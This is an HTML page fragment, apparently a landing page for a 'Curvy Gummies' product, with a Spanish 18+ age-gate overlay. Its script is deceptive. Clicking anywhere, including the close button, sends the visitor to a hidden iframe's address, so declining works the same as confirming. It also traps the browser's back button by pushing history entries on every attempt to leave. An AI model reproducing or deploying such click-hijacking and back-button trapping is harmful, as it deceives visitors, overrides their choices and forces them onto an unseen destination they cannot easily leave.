<body class="en ltr">
	<div class="wrap">
		<div class="steps-box">
			<div class="steps">
				<ul>
					<li class="step">
						<div class="start">

								title="Curvy Gummies"

						</div>
					</li>

			</div>
		</div>
	</div>
	<div style="position:fixed;width:300px;text-align:center;top:50%;left:50%;transform:translate(-50%, -50%);background-color:#1a1b2f;border-radius:15px;color:#fff;box-shadow:0px 0px 10px 1px rgba(0, 0, 0, 0.42);padding:35px 25px;z-index:9999;">
		<div onclick="go_away()" style="position:absolute;top:-15px;right:-15px;width:30px;height:30px;background:#ff3b5c;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-weight:700;font-size:16px;border:2px solid #fff;z-index:10000;">
			×
		</div>
		<div style="width:120px;height:120px;margin:0 auto 20px;border:4px solid #ff3b5c;border-radius:50%;display:flex;align-items:center;justify-content:center;">
			<p style="font-size:48px;color:#ff3b5c;font-weight:800;margin:0;line-height:1;">18+</p>
		</div>
		<p style="font-weight:700;font-size:20px;margin:0 0 15px;letter-spacing:1px;">SOLO ADULTOS</p>
		<p style="font-size:15px;margin:0 0 25px;line-height:1.4;">Por favor confirma que eres <span style="font-weight:700">mayor de 18 años</span> para ver el sitio web</p>
		<div style="display:flex;justify-content:center;">
			<button onclick="redirectToIframeUrl()" style="padding:12px 20px;background:#4CAF50;border:none;color:white;border-radius:8px;cursor:pointer;font-size:15px;font-weight:700;width:100%;max-width:200px;">SOY MAYOR DE 18</button>
		</div>
	</div>
	<script>
	// Función simplificada sin peticiones externas
	function getUserLocation() {
		console.log('Función de ubicación cargada');
	}

	// Llamar a la función cuando se carga la página
	document.addEventListener('DOMContentLoaded', getUserLocation);

	function redirectToIframeUrl() {
		const iframe = document.getElementById('mainIframe');
		const url = iframe.src;
		window.location.href = url;
	}

	function go_away() {
		const iframe = document.getElementById('mainIframe');
		const url = iframe.src;
		window.location.href = url;
	}
	document.querySelector('body').addEventListener('click', go_away);
	history.pushState("back", null, null);
	window.onpopstate = function() {
		history.pushState('back', null, null);
	};
	</script>
